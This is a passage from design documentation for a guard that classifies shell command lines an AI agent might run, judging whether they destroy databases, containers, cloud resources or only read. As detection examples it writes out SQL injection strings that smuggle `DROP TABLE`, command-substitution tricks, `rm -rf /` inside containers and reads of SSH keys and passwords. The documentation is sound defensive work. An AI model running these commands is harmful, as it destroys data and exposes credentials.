'it\'s'` is safe in MySQL, and `SELECT 'a\'; DROP TABLE t; SELECT '` is not. A
`--` that no space follows is no comment in MySQL, so `SELECT "a\"; DROP TABLE
t; --"` leaves only `--"` open, and the `DROP` runs.
The same text without the `SET`, `SELECT 'a\'; DROP TABLE t; -- '`, is
`drop_data` for the same reason: a server set that way runs the `DROP`.

In `psql` a backslash outside a string starts a
command that ends at the end of its line or at the next backslash outside a
quote, which starts the next command (or is `\\`, and the SQL goes on after
it): `SELECT 1 \g out.txt \\ DROP TABLE t` drops the table, and `\set x 1 \!
touch f` runs `touch`. A here-document whose first line starts with a
backslash is read from that line. `\gexec` and
`\gset` run or keep text the line does not show, so they are `unknown`; `\!`,
a backtick in an argument, `\copy … program`, and `\o`, `\g`, `\gx` or `\w`
followed by `|` run a program. A statement the reader has to guess at is
`unknown`, never safe: a string, a comment or a `$$` string that is never
closed.

A variable the client fills in is only known when it runs, and where it starts
a statement the statement is `unknown`: `psql`'s `:name`, `:'name'` and
`:"name"` (`psql -v q='DROP TABLE t' <<< ':q'`, a `\set q …` and then `:q`) and
`sqlcmd`'s `$(name)` (`sqlcmd -v s="DROP TABLE t" -Q '$(s)'`). A `:name` or
`$(name)` further in is read as a word (`WHERE a = :x`), as a shell expansion
is, and `::` is a cast.

A statement that is only known when it runs (`psql -c "$Q"`, `-c $(cat
q.sql)`, a here-document that is just `$Q`) is `unknown`, with the reason `runs
a database statement only known when it runs`. In a double-quoted
POSIX statement the expansions stand as words, so `psql -c "DELETE FROM users
WHERE id = $id"` is read and is safe, `psql -c "DROP TABLE $t"` is
`drop_data`, and `psql -c "$verb FROM users"` is `unknown`. A variable stands
for a value, but a command substitution prints what it likes, a whole
statement too: a statement with a `$(…)` (not arithmetic, `$((…))`) or a
backtick is `unknown` as well as read (`psql -c "SELECT 1 $(echo '; DROP
TABLE t')"`, `"${x:-$(cat q)}"`, the same in a here-string, a here-document
and in what `echo`, `printf` or `Write-Output` say). Which expansion runs a
command is taken from the parse, not from the text: in an unquoted
here-document a quote is a character like any other, so `SELECT '$(cat q)'`
there still runs `cat`. A `$` that starts
an expansion ends the word before it, since the expansion may be empty:
`psql -c "DROP$x TABLE t"`, `"TRUNCATE$x t"` and `"DELETE$opts FROM t"` are
`drop_data`, and so is `mongosh --eval "db.dropDatabase$x()"`. A template
with an escaped `$` or backtick in it (`psql <<< "SELECT \$( ; DROP TABLE t;
) $x"`, `echo "SELECT 1 \`; DROP TABLE t; \` $x" | psql`) is `unknown`, as an
unquoted here-document with both is: the shell passes the escaped text to the
client as it is, and the reader would take `\$(`, `\${` and a pair of
backticks for one expansion that hides the text between them; this covers
`echo`, `printf` and `Write-Output` too. On PowerShell and
cmd that is not so: an expansion in a double-quoted word (`$id`, `$(…)`,
`%id%`) is not read as a word, so any statement with one is `unknown`
(`psql -c "DELETE FROM t WHERE id = $id"`), even one that would destroy
(`psql -c "DROP TABLE t; $x"` is `unknown`, not `drop_data`); a single-quoted
PowerShell word has none. A client command that runs a
program is `unknown` too: `\!` in `psql` and `mysql`, `COPY … PROGRAM`,
`.shell`, `.system` and `.read |cmd` in `sqlite3` and `duckdb`, `xp_cmdshell`,
and `system` in `mysql` (it is no command of another client: ClickHouse's
`SYSTEM FLUSH LOGS` is a statement).
A script a Redis client runs (`EVAL`, `EVALSHA`, `FCALL`) that is only known
when it runs is `unknown` too.

**A file in the workspace is the agent's own.** `sqlite3` and `duckdb` on a
database file are judged like any file: inside the workspace or a temporary
directory, in memory (`:memory:`, no file) or opened `-readonly`, a `DROP`
is safe; anywhere else, or a file only known when it runs, it is `drop_data`.
`ATTACH`, `.open` and `.attach` reach another file, so they make the file
given not the only one, and the statements are judged as a file outside the
workspace, `-readonly` or not. A name with a scheme is read from its path when
it is a `file:` URI (`file:/home/me/x.db`, `file:///home/me/x.db`,
`file://localhost/…`, `%HH` decoded; `mode=memory` is in memory) and is not
the agent's own otherwise (`md:`, `motherduck:`, `s3://`); a Windows drive
(`C:`) is a path. The options that take a value are the ones `sqlite3 -help`
lists, the two-value `-lookaside` and `-pagecache` included, so none moves the
file onto its value. Every server database is risky, because the line cannot
tell a scratch database from production.

**A client in a container or on another machine** is read as the client
itself: `docker exec`, `docker container exec`, `podman exec` and `nerdctl
exec` (their options end at the container, and `-e`, `-u`, `-w`,
`--env-file`, `--detach-keys` and `--preserve-fds` take a value; with
`podman`'s `-l` or `--latest` there is no container, and the command comes
first), `docker compose exec` and `docker-compose exec` (the service),
`kubectl exec` and `oc exec` (the command after `--`, or after the pod in the
old form), and `ssh HOST` (the words after the host, with `ssh`'s options
before or after it). The command there is read as the line would read it
here, with the POSIX grammar: wrappers come off (`ssh db sudo -u postgres
psql …`, `docker exec db timeout 5 psql …`), a shell's `-c` line is split as
`sh -c`'s is, its options and their values skipped (`bash -o pipefail -c
…`), and `ssh` joins its words with spaces into a line the remote shell
splits (`ssh db 'cd /srv && psql -c …'`). Each database client of it is
judged as running there; nothing else of it is judged, since its files are
not this machine's. What the grammar cannot read there, or a program only
known when it runs (`ssh db 'ps${x}ql …'`, `docker exec db $CLIENT …`), is
`unknown` there as it is here, and so is an `ssh` command with a word only
known when it runs, which the remote shell reads as code (`ssh db "psql -c
\"$Q\""`). The client keeps the input of the command that runs it, so `cat
dump.sql | docker exec -i db psql` runs statements the line does not show. A
database file there is never the agent's own: `docker exec db sqlite3 data.db
'DROP TABLE t'` is `drop_data`. Up to eight such layers are read (`ssh a ssh
b psql …`); more is `unknown`.

Migrations run by the project's own tool (`sqlx migrate run`, `rails
db:migrate`) are safe: the guard reads no program that is not on its list.

Not read, so the caller has to account for them: a client started by `docker
run`, `docker compose run`, `kubectl run`, `kubectl debug` or `oc rsh`; what a file of statements holds, even
one the line writes; stored procedures (`CALL p()`, `EXEC p`),
whatever they run; the
text of a prepared statement that is not on the line (`EXECUTE s` after a
`PREPARE` in an earlier call; one in the same text is read); a `WHERE`
that is true for every row in a way other than `1`, `TRUE` and `1 = 1`;
a `psql` variable or `sqlcmd` `$(var)` that does not start a statement
(`WHERE a = :x`: it is read as a word, and may hold more than a value);
`sqlcmd`'s `!!` and `GO`; other clients (`pgcli`, `mycli`, `litecli`,
`pg_restore --clean`).

## Containers, clusters, infrastructure and the cloud

`destroy_resources` is for what a delete verb removes that is not a path:
containers and their volumes, cluster objects, an infrastructure stack, a
hosted repository or site, and what a cloud CLI or an object store deletes.
`docker volume rm pgdata` names no file the guard looks at. The rule reads the
program, its global options, its command and sub-command like the git rules do,
and the few options that change what a command does. Listing, describing,
creating and building are safe (`kubectl get`, `terraform plan`, `aws s3 ls`,
`docker build`).

One rule, one meaning: a local target (a `kind` or `minikube` cluster, a
container on the local daemon) is as risky as a remote one, since the line
cannot tell, and the reason says what it deletes, not where.

**Containers** (`docker`, `podman`, `nerdctl`, `docker-compose`,
`podman-compose`, and the programs that take docker's commands under another
name: `podman-remote`, `finch` and `nerdctl.lima`). `system prune`, `container
prune`, `network prune`, `volume rm` and `volume prune`, `image prune -a`,
`stack rm`, `service rm`, `secret rm`, `config rm`, `node rm`, `swarm leave
--force` (or `-f`; not `--force=false`), `compose down -v` and `compose rm -v`,
and podman's `system reset`, `pod prune`, `machine rm`, `machine reset`, `kube
down` and `kube play --down` (or `play kube --down`, its older name) destroy;
so do `docker-machine rm` and `colima delete`, which delete a virtual machine
with its containers. `rm` is read by what it takes: one named container is
safe, forced or not (`docker rm -f web`); several forced at once, a choice made
when the line runs (`$(docker ps -aq)`, a pipe's input, a variable that expands
to several words, a wildcard the shell expands, what `find -exec docker rm -f
{} +` finds), podman's `rm -a` and `--filter`, and `-v` (the container's
volumes) are not. A wildcard (`docker rm -f *`, `web-?`) is every name it
matches in a POSIX shell and in PowerShell, which expands one for a program on
Linux and macOS; cmd hands it to the program as it is. The guard reads an
argument as the program gets it, its quotes gone, so a quoted wildcard (`docker
rm -f '*'`, `"web-*"`) counts as several too, though docker is handed the
pattern and expands nothing: the riskier reading. A `{}` of `find -exec` stands
for every name the search finds, so a container or image removed through one is
several at once. Which variables expand to several words depends on the shell:
in a POSIX shell an unquoted one, and a quoted one holding an array (`"$@"`,
`"${ids[@]}"`, one word per element), but not `"$name"`; in PowerShell any
variable except `$env:` and a splat (`@ids`), since an array handed to a
program is one argument per element, but not a quoted `"$ids"`; in cmd an
unquoted `%IDS%` or `!IDS!`, which is expanded as text. A POSIX word also
splits when an unquoted `$` follows a quoted head (`"$a"$b`) and when it holds
an unquoted brace list or sequence (`web{1,2}`, `{web,db}`, `web{1..3}`); a
brace list in a word the parser has already unquoted counts as bare. A command
in a loop or a function body runs again with other values, so any operand there
that holds an expansion is every item, whatever the variable is called and
however it was set (`id="$c"`, `name=$(…)`, `$1` after a `shift`, `%%i`): `for
c in $(docker ps -aq); do id="$c"; docker rm -f "$id"; done`, `docker ps -aq |
while read -r l; do docker rm -f "${l%% *}"; done`, `f() { docker rm -f "$1";
}`. Loops are `for`, `select`, `while` and `until` and function bodies in a
POSIX shell; `foreach`, `for`, `while`, `do` and `function` and the block of
`ForEach-Object` (`%`) and `Where-Object` in PowerShell (`docker ps -aq | % {
$c = $_; docker rm -f "$c" }`); `for … do` in cmd (`for /f "delims=" %%i in
('docker ps -aq') do docker rm -f "%%i"`, also behind `@` and in a `do (set
id=%%i& …)` group). Outside a loop, a quoted variable that a `for` or a `read`
sets is still every item. So `for c in web db; do docker rm -f "$c"; done` is
risky too, as several forced at once, while `id=web; docker rm -f "$id"` is one
value and `docker rm -f "$id"; for c in a b; do echo "$c"; done` is safe. So
`docker rm -f "$name"` is safe and `docker rm -f $ids` in PowerShell is not.
Images are rebuilt or pulled again, so `rmi` and `image rm` of the images they
name, forced or not, and a `image prune` without `-a` are safe, as are `network
rm` and `builder prune`; `rmi` and `image rm` are read like `rm` otherwise:
several forced at once, `-a`, and images chosen when the line runs (`docker rmi
-f $(docker images -aq)`) destroy. The global options of each program that take
a value (`-H`, `--context`, `-n`) are skipped to find the command.

**Clusters.** `kubectl` and `oc`: `delete` of anything, with the reason naming
a namespace, `--all` or `-A`; `drain`; `scale --replicas=0`; `replace --force`;
`apply --prune`. `--dry-run=client` and `=server` only rehearse and are safe,
the last one written counting. A replica count is read as Go reads an integer
(`0`, `00`, `0x0`, `0b0`, `0o0`, `0_0`, with a sign, are all zero); one that is
not a plain decimal and not a zero, or only known when it runs, is `unknown`.
`kubectl` is also read behind `microk8s`, `k3s`, `k0s` (also as `k0s kc`) and
`minikube kubectl --`, and as `kubecolor` (which colours its output) and
`microk8s.kubectl`. `oc adm drain` is kubectl's `drain`, and `oc adm prune`
deletes old images, builds or deployments once `--confirm` is on (without it
the command only lists them). `helm uninstall` (also `delete`, `del`, `un`, and
as `helm3`, `microk8s helm`, `microk8s helm3`, `microk8s.helm` and
`microk8s.helm3`) unless `--dry-run` (not `--dry-run=false`, and not a value
only known when it runs, `--dry-run=$DRY`); `helmfile destroy` (also `delete`);
`kind delete cluster`, `minikube delete`, `minikube node delete` and `k3d
cluster delete` (also `node` and `registry`). The tools that deploy to a
cluster: `argocd` (`delete`, `rm` and `delete-resource` among the first words),
`flux delete` and `flux uninstall`, `nomad` (`delete` or `purge` among the
first words, and `job stop -purge`, which deletes the job), `skaffold delete`
and `tilt down`.

**Infrastructure.** `terraform` and `tofu`: `destroy` and `apply -destroy` (a
Go flag, so `-destroy`, `--destroy` and `-destroy=true`, not `-destroy=false`;
any `-destroy` turned on before `--` counts, even with a `=false` after it,
since a value option may have taken that word); `plan -destroy` is safe. `state
rm` (unless `-dry-run`) and `workspace delete` destroy too: what leaves the
state is no longer managed, and a workspace's state goes with it. `terragrunt`
the same, each command read like terraform reads it (`terragrunt state rm x`,
`workspace delete`), also behind `run-all` and `run --all --`: the command is
terragrunt's own word after `run-all`, `run` or `exec`, or else the first word
after `--` (or `terraform` behind `exec --`), the options that take a value
(`--queue-include-dir`, `--parallelism`) skipped. `pulumi destroy` (also `down`
and `dn`, unless `--preview-only`, a Go-style flag that `--preview-only=false`
or a value only known when it runs turns off), `pulumi stack rm` and `pulumi
state delete`; `cdk destroy`, `cdktf destroy`, `sst remove`, `serverless
remove` (also `sls`), `vagrant destroy`, `sam delete`.

**Cloud.** Each CLI has a table of delete verbs in `detect/resources.rs`, with
the options before the command that take a value, so a new CLI is a few lines.
`aws`: `s3 rm` (the reason says when it is `--recursive`), `s3 rb`, `s3 sync
--delete`, `terminate-*`, `delete-*`, `batch-delete-*`, `purge-*`,
`schedule-key-deletion`, `deregister-image`, `close-account`,
`release-address`, `release-hosts`; `--dry-run` and `s3`'s `--dryrun` make it
safe, unless a later `--no-dry-run` turns it off (the CLI takes the last).
`gcloud` (a `delete`, `delete-*`, `bulk-delete` or `destroy` among the first
words, `storage rm`, and `storage rsync` with
`--delete-unmatched-destination-objects`, which `gsutil rsync -d` and `aws s3
sync --delete` match), `gsutil rm`, `rb` and `rsync -d`, `az` (`delete`,
`delete-*`, `purge`, `storage remove`), `doctl` (`delete`, `delete-*`, `d`,
`rm`), `flyctl` and `fly` (`destroy`, `delete`, `rm` and `remove` under any
word, so `m rm`, `vol rm` and `apps rm` are read too), `vercel` (`remove`,
`rm`, `del`, also `env rm`, `project rm` and `blob store rm`), `heroku`
(`apps:destroy`, `addons:destroy`, `pg:backups:delete`), `wrangler` (`delete`
at any depth, `kv:namespace delete`), `firebase` (`…:delete`, `…:remove` and
`…:uninstall`, as in `database:remove` and `ext:uninstall`; `database:set`,
which replaces what is at a path, and `hosting:disable`), `hcloud` (`delete`,
and `rebuild`, which wipes a server's disk), `scw`, `oci` (`delete`,
`bulk-delete`, `terminate`), `eksctl` and `kops` (`delete`), `openstack`
(`delete`, `purge`), `linode-cli` (`delete`, and `obj rm` and `rb`), `exo`
(`delete`, `del`, `rm`), `ibmcloud` (`delete`, `rm`, and verbs that end in
`-delete` or `-rm`, as in `service-instance-delete`), `amplify delete` and
`amplify env remove`, `azd down`, `eb terminate`, `multipass delete` and
`purge`, and `consul` (`kv delete` and every other `delete`). A verb that makes
or sets one thing (`create`, `new`, `put`, `set`, `*-create`, `create-*`) takes
a name after it, never a verb: `argocd app create delete`, `consul kv put
delete x` and `ibmcloud resource service-instance-create delete-me` are safe.
Repositories and sites: `gh` and `glab` (`delete` and `delete-*` after a group:
`repo delete`, `release delete`, `release delete-asset`, but not `alias
delete`, which removes the CLI's own shortcut; and `api` with `-X DELETE` or
`--method DELETE`, in any case, also `--method=DELETE` and `-XDELETE`, the last
one given counting, and `unknown` with a method only known when it runs),
`netlify` (`…:delete` and `…:unset`), `supabase` (`delete`). Object stores:
`rclone` (`purge`, `delete`, `deletefile`, `cleanup`), `s3cmd` (`rb`, `del`,
`rm`) and MinIO's `mc` (`rb`, `rm`; also as `mcli`, its name where `mc` is
Midnight Commander), each safe with `--dry-run` (and rclone's and s3cmd's
`-n`), the last one given counting.

A rehearsal flag (`--dry-run`, `--preview-only`) or `--help` is read only
before `--` and not as the value of an option that takes a value, since pflag
and Go's flag package hand that option the next word even when it starts with
`-` (`kubectl delete ns prod --cache-dir --dry-run=server` still deletes). It
counts only with a value known to say yes: a value only known when it runs may
be `false`, so `helm uninstall api --dry-run=$DRY` is risky, and so is
PowerShell's `--dry-run=$false`.

A command word only known when it runs (`docker $cmd`, `kubectl "$@"`, `aws
s3 $verb`, `gcloud projects $verb prod`, `kind delete $what`, `terragrunt
run-all $cmd`) is `unknown`: the line may be any of the above. For the cloud
CLIs that read a verb at any depth, a word behind a verb that only reads,
creates, copies, runs or changes one thing (`gcloud compute instances describe
$vm`, `get-`, `add-`, `create-`, `update-`, `set-` and `list-` verbs, `put`,
`submit`, `access`, `use`, `link`, `cp`, `mv`, `rsync`, `upload`, `download`,
`publish`, `connect`, `activate`, `build`, `pull`, `promote`, `redeploy`,
`tail`, `dev`, `execute`, `authenticate`, `invoke`) is that verb's operand, so
it stays safe. So is the word after a heroku `topic:command`, which is a leaf
verb too (`heroku config:set $(cat .env)` is safe). A word that is a group in
a CLI that reads it (`gcloud run`, `gcloud projects`) is not one of them: the
word after it is still a verb. A word that is an assignment (`FOO=$BAR`) is
never read as a verb. The options of each CLI that take a value are
listed, and a boolean flag is never in a list: a flag listed by mistake eats
the command word after it (`cdk --json destroy`).

Not read, so the caller has to account for them: a verb that deletes under
another name (`kubectl patch` removing finalizers, `terraform apply` of a plan
that destroys, `terraform taint`, `aws s3 mv`, `rclone sync`, which deletes at
the destination what the source lacks); a program run on another machine (`ssh
host docker system prune`, `docker exec c rm -rf /`, `kubectl exec p -- rm -rf
/`); a command a tool reads from a file or its environment
(`TF_CLI_ARGS=-destroy`, a `kubectl` plugin, a shell alias); a `gh api graphql`
mutation that deletes; and a resource named like a delete verb behind a verb
that does not make or set it (`gcloud functions deploy delete-user` reads as a
delete, because the guard cannot tell the verb from a name that follows).

## Reads only

`classify` says whether a line is safe to run without asking. A caller that
asks on every line in a careful mode has a second question: does this line only
read? `ls`, `git status`, `cat src/main.rs` and `rg TODO` change nothing, and a
caller may run them without a question where it asks on `mkdir build`, which is
safe but changes the disk. Safe and reads-only are different answers, so
`effect` answers the second beside `classify`, and it is not a rule: it adds
nothing to `Rule`, and what a caller does with it is its policy.

```rust
effect(line, shell, &paths) -> Effect   // ReadsOnly(Reach), Changes or Unknown
```

| Answer | When |
| --- | --- |
| `ReadsOnly(Reach)` | Every unit is a known reader run with reading flags on files the guard can name, no redirect writes a file (the null device is not one), no `cd` the guard cannot follow, and the rules found nothing but an elevation or a read of a key. The [`Reach`](#reach) says where it reads. |
| `Changes` | Any unit is a known writer, a package manager or a build tool, any redirect writes a file, or a rule found the line risky for what it changes (`delete`, `wipe_disk`, `overwrite`, `git_discard`, `git_remote`, `git_history`, `permissions`, `system_settings`, `stop_system`, `stop_unknown`, `send_secret`, `drop_data`, `destroy_resources`). |
| `Unknown` | Anything is not understood: a program the table does not know, a program or script known only when it runs, a nested script, a line that cannot be read in full, a limit hit. Never `ReadsOnly`: what cannot be read is not reads-only. |

A line with a known writer is `Changes` whatever else it holds: `mkdir build &&
./script.sh` changes things, and not knowing the rest does not take that back.
`Unknown` is for a line with nothing known to change and something unread.

`effect` and `classify` come from one code path. A line is split once and
judged once, and both answers are read from that split and its findings, never
from the raw text, so they cannot disagree about what the units are. The
answers are independent, and a caller reads both. **Safe is not reads-only and
reads-only is not Safe**: `cat ~/.ssh/id_ed25519` reads only, beyond the
workspace (and is `read_secret`), and `mkdir build` is safe and changes the
disk. One direction does hold, and `tests/` checks it on every row of every
table and on random noise: a line `classify` finds risky for anything but an
elevation or a read of a key is never `ReadsOnly`. `sudo cat /etc/hosts` is
`ReadsOnly(Beyond)` and `Elevated`, and `cat ~/.ssh/id_ed25519` is
`ReadsOnly(Beyond)` and `ReadSecret`: both findings say what the line is, not
that it changes anything. `effect` puts `ReadSecret` beside `Elevated` because
the line still only reads, and the caller, who reads both answers, decides what
a read of a key means. The `Reach` is `Beyond` for a read of a secret even
inside the workspace.

**Wrappers** come off as `classify` takes them off, and what they run decides:
`sudo cat` reads only. Only the wrappers that just run the next program are
let through (`sudo`, `doas`, `gsudo`, `pkexec`, `env`, `nice`, `ionice`,
`time`, `timeout`, `stdbuf`, `xargs`, `command`, `builtin`, `noglob`,
`nocorrect`, `-`, `coproc`, and the `find` a `-exec` makes), and only with
options the guard knows: any other option makes the line `Unknown`, since it
could do anything (`sudo -e` edits a file, `sudo -s` and `-i` start a shell,
`env -P` changes where programs are found, `env -C` the folder they run in).
`time -o FILE` and `time --output=FILE` write a file, so they are `Changes`.
`flock` makes its lock file, `nohup` may make `nohup.out`, `tmux` and `screen`
start sessions: those wrap a reader into `Unknown`. A shell started with a
script (`bash -c`, `eval`, `cmd /c`, `powershell -Command`) is a program the
table does not know, so it is `Unknown` even when the script it holds only
reads.

### Reach

A caller that runs reads-only lines without asking, in its most careful mode,
needs one more answer: do the reads stay in the project? `ls src` and `cat
src/main.rs` do; `cat /etc/passwd`, `grep -r password ~` and `cat
~/.ssh/id_ed25519` do not. So `ReadsOnly` carries a `Reach`:

```rust
Effect::ReadsOnly(Reach)   // Reach::Workspace or Reach::Beyond
```

`Reach` is exhaustive on purpose, like `Effect`: a third answer would change
what a caller's careful mode means by "stays in the workspace".

`Reach` is about reading what is not the project's. Protected paths are about
writes, and do not count here.

- **`Workspace`**: every read lands inside a workspace folder (the
  repository's history, a startup file and a path the caller protects are
  inside it too), in a temporary file, or on the null device, and none is a
  secret.
- **`Beyond`**: at least one read lands anywhere else: the home folder, a
  system folder, a folder that holds the workspace (`..`), a temporary folder
  itself (`ls /tmp`; a file inside it is `Workspace`), a disk, the registry,
  anywhere outside the workspace; or it is a **secret**, core's
  `Sensitivity::Secret` (a key or a credential: `~/.ssh`, `~/.aws`, `~/.netrc`
  and the rest of core's list), even inside the workspace. That is the case of
  a workspace that is the home folder, or one that holds a folder of logins.
- A line that is `Changes` or `Unknown` has no `Reach`. A path known only when
  it runs is already `Unknown`, so it never gets one.

**What a line reads** is the places the answer already judges, each placed by
core the way a path is for `classify` (so `..`, `.`, doubled separators, `~`,
`$HOME`, case, 8.3 names and UNC paths come out as they do there):

- every file operand of a reader and the source of every `<` redirect;
- the folder of every lister (`ls ~`, `find /`, `Get-ChildItem C:\`);
- the value of an option that names a file, such as `grep -f ~/words`;
- the folder a `cd`, `pushd` or `Set-Location` goes into: going in is a read, so
  `cd ~` is `Beyond` even as a line of its own, for a caller that keeps the
  shell between lines;
- **the working directory, when a reader with no file operand reads it
  without being told.** `ls`, `du`, `fd`, `find` with no start, `rg PATTERN`,
  `grep -r PATTERN`, `Get-ChildItem` and `dir` with no path read the folder the
  line runs in: the caller's `cwd`, moved by every `cd` the guard follows, the
  way `classify` follows it. `git` reads the repository at the working
  directory, or at the folder `-C` names (chained: `-C a -C b` is `a/b`, and an
  absolute one starts over). A line run from outside the workspace, or after
  `cd ~` or a `cd ..` past the workspace's root, is `Beyond`;
- the shell's own expansion of a wildcard in an operand of a program that
  opens nothing (`echo ~/.ssh/*` lists a folder);
- for `find`, the file `-newer`, `-anewer`, `-cnewer` and `-samefile` name;
- for `git`, the revisions and pathspecs after the subcommand, read as paths.
  Some are relative to the repository's root, not to the working directory:
  `:/x`, `:(top)x` and every magic pathspec, `:x` and `:0:x` (the index), and
  `REV:x` unless `x` starts `./` or `../`. The guard does not know where the
  root is, so such a path is judged from the working directory and from each
  workspace folder, and a `Beyond` reading wins.

Lines that read nothing (`echo hi`, `pwd`, `true`, `which cargo`, `basename x`,
`printf`) are `Workspace` from anywhere. So are readers of their input (`cat`,
`head`, `tail`, `wc`, `sort`, `grep PATTERN` with no file) given no operand.

**Deep reads.** A reader that goes below the folders it names reaches what is
below them, so a deep read of a folder that holds a secret is `Beyond`: `rg
PATTERN`, `grep -r`, `diff -r`, `ls -R`, `du`, `find`, `fd`, `git`, PowerShell
`Get-ChildItem -Recurse` (and `-Depth`), cmd `dir /s` and `findstr /s`. It is a
whitelist: a reader is shallow only when its table entry says so for the flags
it is given (`cat`, `head`, `tail`, `wc`, `stat`, `realpath`, `sort`, `file`,
`less`, `df`; `ls`, `diff` and `grep` without a recursive flag; in PowerShell
`Get-Content`, `Select-String`, `Get-Item`, `Test-Path`, `Resolve-Path` and
`Get-ChildItem` without `-Recurse`; in cmd `type`, and `dir` and `findstr`
without `/s`). Anything recursive or unknown is deep, a reader added later
included. A flag counts by any prefix of its long name, as GNU programs and
PowerShell read it (`diff --rec`, `ls --recurs`, `gci -Rec`), and an argument
known only when it runs could be one. A deep read of a folder that holds no
secret, which is nearly every project folder, stays `Workspace`.

A *listing of names* (`ls -R`, `find .`, `git ls-files`, `fd`, `du -a`) is
deep too: it shows where a secret is, so a listing that reaches one is
`Beyond`, and one that only reaches protected paths, `.git` or a startup file
is `Workspace`.

**Wildcards.** A wildcard is judged by what it can pick, with the shell's own
rules for hidden names: a POSIX `*` does not match a leading dot (unless
`dotglob`, `globdots` or `GLOBIGNORE` is on) and `.*` does; PowerShell and cmd
wildcards always do, so `Get-Content *\*` and `Select-String -Path *\*` reach a
hidden folder. A pattern that picks a secret, or goes below one, is `Beyond`; a
deep read of a pattern that picks a folder holding one is too. In PowerShell
and cmd a wildcard with a recursion is a filter on every folder below the one
it starts in. A part that starts with a dot and matches `..` (`.*`, `.?`)
reads the folder above as well, in the shells whose patterns match it.

What a line reads is also judged by what a place is *to the workspace*, which
core's place does not say: a protected path or a startup file is the
workspace's own only when it is inside a workspace folder (`~/.bashrc` is
`Beyond` from a workspace elsewhere, and `Workspace` when the home folder is
the workspace; `~/.agent/x` is `Beyond` when the protected folder is in the
home), judged by the spelling alone, as the paths are.

Whitelist, not blacklist: only the readers known to read just their operands or
their input are left out of the working-directory rule (`cat`, `head`, `tail`,
`wc`, `stat`, `realpath`, `diff`, `sort`, `file`, `less`, `df`; in PowerShell
`Get-Content`, `Select-String`, `Get-Item`, `Test-Path`, `Resolve-Path`; in cmd
`type`, `findstr`). Any other reader, and any reader added to the table later,
is taken to read the working directory when it has no operand, and a reader
whose implicit input cannot be placed is `Beyond`: `df` with no operand reports
every mounted disk.

What stays open, and a caller should know:

- `grep -R`, `rg -L` and `--follow`, and `find -L` and `-follow` follow
  symbolic links by design, so a link in the workspace to a folder of keys is
  read through. Links are placed by their spelling, as everywhere in the guard.
- `git diff`, `git log -p` and `git blame` read the content of every tracked
  file, and a secret that is committed is among them (`git show HEAD:.ssh/x` and
  a pathspec that names it are read as paths and are `Beyond`; the bare `git
  diff` is not). The repository git finds above the working directory is read
  too, and the guard cannot see where it is: a workspace that is not itself a
  repository, inside one that is, reads beyond it.
- `test`, `[` and `[[ ... ]]` check that a file exists and read nothing.
- A POSIX `*` over the home folder (`cat */x` run in it) is `Beyond` because the
  folder is the home folder, whatever the pattern picks; a pattern that picks
  the folder of a login (`cat *` in a folder holding `gh`) is `Beyond` too, as
  `cat` would open it.

### The paths a line reads

`Reach` is judged by spelling, because the guard never touches the disk. So a
link inside the workspace that points out of it reads as `Workspace`: with
`link -> ~/.ssh`, the line `cat link/id_rsa` is `ReadsOnly(Reach::Workspace)`.
A caller that can look at the disk, and runs `Workspace` reads without asking,
needs the places the line reads to check them itself, and how the program
reaches from each: `cat *.rs` opens whatever the shell expands the pattern to
(`a.rs -> ~/.ssh/id_rsa`), `cat src/*/x.rs` is expanded across `src/a -> ~`,
and `grep -R x src` or `ls src | xargs cat` opens what it finds through links.
The guard has already placed each read, so `effect_paths` returns them, from
the same reading as `effect` (one pass, not a second walk):

```rust
effect_paths(line, shell, &paths) -> Option<Vec<ReadPath>>   // Some only for ReadsOnly(_)

pub struct ReadPath { pub path: PathBuf, pub how: How }
pub enum How {
    Exact,                              // one path
    Glob(String),                       // a pattern: `path` is its folder, this the rest
    Tree { follows_links: bool },       // a folder the program walks, or lists for another
}
```

Both enums are exhaustive, like `Effect`: a way of reading the caller does not
handle would be a way past its check.

It is `Some` exactly when `effect` is `ReadsOnly(_)`, the reach either way, and
`None` for `Changes` and `Unknown`. A test holds every row of every table to
that, and holds the paths of every `ReadsOnly(Workspace)` row to be inside a
workspace folder or a temporary folder by spelling (the `..` of the list applied
for that comparison, as `effect` applies them).

**How each is read, and what a caller does with it:**

| `how` | Which reads | What the caller checks on disk |
| --- | --- | --- |
| `Exact` | A file operand, a `<` source, a folder a lister lists, a `cd` target, a path `git` takes. | Canonicalize the path, which follows each link before the `..` after it: when it does not exist, canonicalize its nearest existing ancestor and put the rest of the names back. |
| `Glob(rest)` | A pattern the shell expands: `path` is the fixed folder it expands in and `rest` what follows it, as written (`src/*/x.rs` is `src` and `*/x.rs`; `*.rs` is the working directory and `*.rs`; `.a*/x` is the working directory and `.a*/x`, the leading dot kept; `C:\*` is `C:\` and `*`). A `for` over a pattern is the same, and so is a pathspec `git` expands. | Expand `path` + separator + `rest` on disk the way the shell does (a wildcard may match a leading dot: match it, to be safe), and canonicalize the folder and every match. The expansion crosses links, so a link shows in a match. |
| `Tree { follows_links: false }` | A folder walked by one of the readers known to stay out of links, given only flags its own list says do not change that: `grep -r` (not `-R`, `-S`), `rg` and `fd` (not `-L`, `--follow`), `find` (not `-L`, `-follow`, `-xtype`, `-exec`, `-ok`), `ls -R` and `du` (not `-L`, `-H`, `--dereference`), and the repository `git` reads (not `--no-index`). `find -H` and `grep -O` follow only the folder named on the command line, which is the root: they stay here. | Canonicalize the root. That is the whole check: such a reader does not cross a link it meets below it. |
| `Tree { follows_links: true }` | A folder walked by a reader that opens what it finds through links: `grep -R` and `grep -rS`, `rg -L` and `--follow`, `fd -L`, `find -L`, `-follow` and `-exec`, `ls -RL`, `du -L`, `diff -r`, and any reader the guard does not know to stay out of links (every PowerShell and cmd walk included). It fails closed: a walker on the list that is given any flag its list does not name, an abbreviation of a flag included (`ls -R --recurs`), follows. Also the folder of a lister whose names a later stage opens: `ls src \| xargs cat`, `git ls-files \| xargs cat`, `find src -print0 \| xargs -0 grep x`, `Get-ChildItem \| Get-Content`. | A link anywhere below the root can lead out, which only walking the folder shows. A caller may simply treat the line as reading beyond the workspace, or walk the folder and canonicalize every entry. |

Where the same place is read in more than one way, the entry that asks the
most is kept: a walk that follows links over a walk that does not, either over
an exact path. A pattern whose matches are walked through links, or whose
listing is handed on, is the walk from its folder.

A caller treats the line as reading beyond the workspace when anything these
checks find leaves it. It compares with the workspace folders after
canonicalizing them too, and with the temporary folders the guard allows,
canonicalized the same way: `/tmp`, `/var/tmp` and `/var/folders`, and on a
Mac `/private/tmp`, `/private/var/tmp` and `/private/var/folders` (`/tmp`
canonicalizes to `/private/tmp`, and `/var/folders` to `/private/var/folders`);
on Windows `%USERPROFILE%\AppData\Local\Temp` and `C:\Windows\Temp`. A temporary
path is `Workspace` by the rule for temporary files, not because it is inside
